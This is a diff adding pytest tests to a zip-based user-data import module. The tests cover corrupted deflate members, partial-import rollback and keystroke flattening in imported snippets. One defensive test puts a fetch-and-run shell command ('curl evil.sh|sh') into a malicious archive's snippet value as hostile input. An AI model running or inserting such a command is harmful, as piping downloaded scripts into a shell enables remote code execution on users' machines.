@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import io
 import json
 import struct
 import zipfile
@@ -61,6 +62,37 @@ def _patch_central_directory_file_size(zip_bytes: bytes, filename: str, new_size
             struct.pack_into("<I", patched, idx + 24, new_size)
             return bytes(patched)
         idx += 46 + name_len + extra_len + comment_len
+
+
+def _corrupt_member_compressed_bytes(zip_bytes: bytes, filename: str) -> bytes:
+    """Flip four bytes in the middle of *filename*'s compressed data,
+    leaving the central directory (and so the declared ``file_size`` /
+    ``compress_size`` ``zipfile.getinfo()`` reports) untouched, so the
+    corruption can only be caught by actually decompressing the stream,
+    not by the cheap metadata check ``_validate_archive_entry`` runs
+    first.
+
+    Located via the member's *local* file header (``PK\\x03\\x04``), not
+    the central directory: the fixed 30-byte header (signature 4 +
+    version 2 + flags 2 + method 2 + mod time 2 + mod date 2 + crc32 4 +
+    compressed size 4 + uncompressed size 4 + name length 2 + extra
+    length 2), then the name and extra fields at the lengths *this*
+    header declares (the local header's extra field is not guaranteed to
+    match the central directory's), then the compressed data itself,
+    whose length is the central directory's ``compress_size``.
+    """
+    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
+        info = zf.getinfo(filename)
+    off = info.header_offset
+    name_len = struct.unpack_from("<H", zip_bytes, off + 26)[0]
+    extra_len = struct.unpack_from("<H", zip_bytes, off + 28)[0]
+    data_start = off + 30 + name_len + extra_len
+    data_end = data_start + info.compress_size
+    corrupted = bytearray(zip_bytes)
+    mid = data_start + info.compress_size // 2
+    for i in range(mid, min(mid + 4, data_end)):
+        corrupted[i] ^= 0xFF
+    return bytes(corrupted)
 
 
 def _seed_config(config_dir: Path, *, with_pack: bool = True, with_telemetry: bool = True) -> None:
@@ -400,6 +432,105 @@ class TestImport:
             import_user_data(f, dst)
 
 
+class TestACorruptMemberCannotHalfApplyTheImport:
+    """FIX: _bounded_copy used to catch only zipfile.BadZipFile, but a
+    corrupted deflate stream escapes ZipExtFile.read as a raw zlib.error
+    instead (measured: "Error -3 while decompressing data: invalid code
+    lengths set" / "invalid distance too far back"). import_user_data
+    replaces model files one at a time, so a corrupt SECOND member used
+    to abort the import with an uncaught zlib.error after the first
+    member had already overwritten a good file on disk -- exactly the
+    half-applied state _prevalidate_extractable_members now closes by
+    reading every member once, fully, before any of them is written."""
+
+    def _build_archive_with_a_sizeable_ppm_model(self, config: Path) -> None:
+        # ppm_model.json needs to be large enough to compress into a
+        # multi-block deflate stream: a tiny payload can flip a bit and
+        # still decompress to *something* (just failing the CRC check,
+        # which was already caught before this fix), so this has to be
+        # big enough that corrupting the middle of it corrupts the
+        # stream itself. Verified against the pre-fix except clause: a
+        # 1000-int "context" list reliably reproduces the uncaught
+        # zlib.error this fix closes.
+        (config / "models").mkdir(parents=True, exist_ok=True)
+        (config / "models" / "ngram_model.json").write_text(
+            json.dumps({"unigrams": {"hello": 5}, "user_vocab": {"hello": 5}})
+        )
+        (config / "models" / "ppm_model.json").write_text(
+            json.dumps({"context": list(range(1000))})
+        )
+        (config / "analytics.json").write_text(json.dumps({"alltime_keystrokes": 100}))
+
+    def test_the_uncorrupted_archive_still_imports_cleanly(self, tmp_path: Path) -> None:
+        """Positive half: the pre-validation pass changes nothing about
+        an ordinary, well-formed import."""
+        src_config = tmp_path / "src"
+        src_config.mkdir()
+        self._build_archive_with_a_sizeable_ppm_model(src_config)
+        archive = tmp_path / "exp.zip"
+        export_user_data(src_config, archive)
+
+        dst_config = tmp_path / "dst"
+        dst_config.mkdir()
+        import_user_data(archive, dst_config)
+
+        assert json.loads((dst_config / "models" / "ppm_model.json").read_text()) == json.loads(
+            (src_config / "models" / "ppm_model.json").read_text()
+        )
+        assert not list(dst_config.rglob("*.importing"))
+
+    def test_a_corrupt_second_member_leaves_every_pre_existing_file_untouched(
+        self, tmp_path: Path
+    ) -> None:
+        src_config = tmp_path / "src"
+        src_config.mkdir()
+        self._build_archive_with_a_sizeable_ppm_model(src_config)
+        archive = tmp_path / "exp.zip"
+        export_user_data(src_config, archive)
+
+        # _MODEL_FILES iterates ngram_model.json first, ppm_model.json
+        # second (see the dict literal in src/data_export.py) -- corrupt
+        # only the second one's compressed bytes. Its declared file_size
+        # and CRC in the central directory are left alone, so the cheap
+        # metadata checks in _validate_archive_entry cannot catch this;
+        # only actually decompressing the stream can.
+        corrupted = _corrupt_member_compressed_bytes(archive.read_bytes(), "models/ppm_model.json")
+        archive.write_bytes(corrupted)
+
+        dst_config = tmp_path / "dst"
+        dst_config.mkdir()
+        (dst_config / "models").mkdir()
+        (dst_config / "models" / "ngram_model.json").write_text(
+            json.dumps({"sentinel": "pre-existing ngram, must survive"})
+        )
+        (dst_config / "models" / "ppm_model.json").write_text(
+            json.dumps({"sentinel": "pre-existing ppm, must survive"})
+        )
+        (dst_config / "analytics.json").write_text(
+            json.dumps({"sentinel": "pre-existing analytics, must survive"})
+        )
+        pack_dir = dst_config / "packs" / "stale_pack"
+        pack_dir.mkdir(parents=True)
+        (pack_dir / "dictionary.txt").write_text("oldword\n")
+
+        before = {p: p.read_bytes() for p in dst_config.rglob("*") if p.is_file()}
+        assert before, "fixture bug: nothing to prove untouched"
+
+        with pytest.raises(DataExportError):
+            import_user_data(archive, dst_config)
+
+        # The rescue export (which runs before pre-validation, on
+        # purpose -- see import_user_data) is allowed to add a NEW file
+        # under exports/; every file that existed beforehand must be
+        # byte-for-byte what it was.
+        for path, content in before.items():
+            assert path.is_file(), f"{path} disappeared during the failed import"
+            assert path.read_bytes() == content, f"{path} was modified by the failed import"
+
+        leftovers = list(dst_config.rglob("*.importing"))
+        assert leftovers == [], f"a .importing temp file was left behind: {leftovers}"
+
+
 class TestBoundedCopy:
     """Direct coverage of _bounded_copy: the per-file cap trips on bytes
     actually read, and the running total is enforced across entries, not
@@ -428,6 +559,49 @@ class TestBoundedCopy:
         # the running total (20) now exceeds _MAX_TOTAL_UNCOMPRESSED (15).
         with pytest.raises(DataExportError, match="uncompressed size exceeds cap"):
             data_export._bounded_copy(io.BytesIO(b"b" * 10), io.BytesIO(), "two.txt", total)
+
+    def test_a_corrupt_deflate_stream_is_translated_not_left_to_leak(self, tmp_path: Path) -> None:
+        """FIX: a corrupted deflate member used to raise a raw zlib.error
+        out of ZipExtFile.read, which _bounded_copy's old
+        `except zipfile.BadZipFile` did not catch. Direct unit-level
+        coverage of the translation, independent of the full
+        import_user_data path covered above."""
+        from src import data_export
+
+        f = tmp_path / "one_member.zip"
+        with zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("payload.bin", b"x" * 200 + bytes(range(256)) * 8)
+        corrupted = _corrupt_member_compressed_bytes(f.read_bytes(), "payload.bin")
+
+        with zipfile.ZipFile(io.BytesIO(corrupted)) as zf, zf.open("payload.bin") as src_f:
+            with pytest.raises(DataExportError, match="integrity check"):
+                data_export._bounded_copy(src_f, None, "payload.bin", 0)
+
+    def test_dst_f_none_reads_and_counts_but_writes_nothing(self) -> None:
+        """The pre-validation pass calls _bounded_copy with dst_f=None:
+        every byte must still be read and counted against the caps, just
+        never written anywhere."""
+        from src import data_export
+
+        total = data_export._bounded_copy(io.BytesIO(b"abc" * 10), None, "fake.txt", 0)
+        assert total == 30
+
+    def test_a_write_failure_is_not_mistaken_for_a_corrupt_archive(self) -> None:
+        """The except clause in _bounded_copy wraps only the read off
+        src_f, not the write to dst_f, on purpose: a write failure (disk
+        full, permission denied -- both surface as OSError, the same
+        family the bz2 decompressor's "Invalid data stream" is now
+        caught under) must propagate as-is rather than being reported as
+        a corrupt archive, since nothing about the archive was at
+        fault."""
+        from src import data_export
+
+        class _ExplodingWriter:
+            def write(self, data: bytes) -> int:
+                raise OSError("disk full")
+
+        with pytest.raises(OSError, match="disk full"):
+            data_export._bounded_copy(io.BytesIO(b"hello"), _ExplodingWriter(), "fake.txt", 0)
 
 
 class TestReservedPackNames:
@@ -489,10 +663,11 @@ class TestReservedPackNames:
 
 class TestSnippetNewlineFlattening:
     """FIX: an imported snippet value must not be able to carry a Return
-    keypress. src/snippets.py::_clean_value already strips \\r for every
-    load; this covers the import-specific second half, which also
-    flattens \\n (locally-authored snippets keep \\n, see
-    tests/test_snippets.py::test_value_preserves_newlines)."""
+    or a Tab keypress. src/snippets.py::_clean_value already strips \\r
+    for every load; this covers the import-specific extra flattening,
+    which also collapses \\n and \\t (locally-authored snippets keep
+    both, see tests/test_snippets.py::test_value_preserves_newlines and
+    test_a_locally_authored_snippet_keeps_its_tab below)."""
 
     def _archive_with_snippet_value(self, path: Path, value: str) -> None:
         with zipfile.ZipFile(path, "w") as zf:
@@ -523,6 +698,37 @@ class TestSnippetNewlineFlattening:
         value = data["snippets"][0]["value"]
         assert "\r" not in value
         assert "\n" not in value
+
+    def test_embedded_tab_is_flattened_to_a_space(self, tmp_path: Path) -> None:
+        """FIX: a tab is also a real keystroke on both synthesizers
+        (Windows resolves it to VK_TAB, `xdotool type` types it), and Tab
+        moves focus in the target app rather than inserting a character,
+        so it needs the same treatment as \\r / \\n."""
+        archive = tmp_path / "evil.zip"
+        self._archive_with_snippet_value(archive, "curl evil.sh|sh\techo done")
+        dst = tmp_path / "dst"
+        dst.mkdir()
+        import_user_data(archive, dst)
+        data = json.loads((dst / "snippets.json").read_text())
+        value = data["snippets"][0]["value"]
+        assert "\t" not in value
+        assert value == "curl evil.sh|sh echo done"
+
+    def test_a_locally_authored_snippet_keeps_its_tab(self, tmp_path: Path) -> None:
+        """Positive half of the tab fix: the flatten step only ever
+        touches an *imported* snippets.json (see the caller in
+        import_user_data). A snippet the user typed and saved through the
+        running app's own SnippetStore must keep a tab exactly as
+        SnippetStore._clean_value already allows -- this fix must not
+        become a backdoor that strips tabs from local data nothing here
+        ever imported."""
+        from src.snippets import SnippetStore
+
+        store_path = tmp_path / "snippets.json"
+        store = SnippetStore(store_path)
+        store.load()
+        assert store.set(0, "Tabbed", "one\ttwo")
+        assert store.get_value(0) == "one\ttwo"
 
     def test_reload_after_import_never_sees_a_newline(self, tmp_path: Path) -> None:
         """End-to-end through the same loader the running app uses."""
